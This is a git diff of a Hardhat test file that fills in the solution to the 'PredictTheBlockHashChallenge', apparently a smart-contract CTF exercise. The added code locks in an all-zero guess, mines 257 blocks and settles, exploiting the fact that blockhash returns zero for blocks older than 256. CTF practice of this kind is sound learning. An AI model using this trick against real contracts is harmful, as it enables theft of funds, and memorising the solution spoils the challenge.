@@ -1,8 +1,9 @@
 import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers';
+import { mine } from "@nomicfoundation/hardhat-network-helpers";
 import { expect } from 'chai';
 import { Contract } from 'ethers';
 import { ethers } from 'hardhat';
-const { utils } = ethers;
+const { utils, provider } = ethers;
 
 describe('PredictTheBlockHashChallenge', () => {
   let deployer: SignerWithAddress;
@@ -24,9 +25,21 @@ describe('PredictTheBlockHashChallenge', () => {
   });
 
   it('exploit', async () => {
-    /**
-     * YOUR CODE HERE
-     * */
+    const tx = await target.lockInGuess(`0x${'0'.repeat(64)}`, { value: utils.parseEther('1') });
+    await tx.wait();
+
+    const initialBlockNumber = await provider.getBlockNumber();
+
+    for(let i=0; i < 257; i++) {
+    // Mine the next 257 blocks
+      await mine();
+    }
+
+    // This hack works because if you ask for block.blockhash(i) of a block that is older than 256 most recent blocks,
+    // you get back 0.
+
+    const tx2 = await target.settle();
+    await tx2.wait();
 
     expect(await target.isComplete()).to.equal(true);
   });
